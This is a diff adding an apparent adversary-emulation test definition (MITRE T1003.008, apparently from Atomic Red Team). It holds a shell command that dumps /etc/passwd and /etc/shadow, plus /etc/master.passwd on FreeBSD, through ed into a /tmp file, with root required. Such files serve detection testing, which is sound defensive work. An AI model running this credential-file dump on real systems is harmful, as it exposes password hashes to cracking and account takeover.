@@ -1,0 +1,31 @@
+{
+    "name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",
+    "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "executor": {
+        "command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > ${output_file}; fi\n",
+        "cleanup_command": "rm -f #{output_file}\n",
+        "name": "sh",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003.008",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "/etc/passwd and /etc/shadow",
+    "source": "ART",
+    "uuid": "df1a55ae-019d-4120-bc35-94f4bc5c4b0a",
+    "arguments": {
+        "output_file": {
+            "description": "Path where captured results will be placed",
+            "type": "path",
+            "default": "/tmp/T1003.008.txt"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
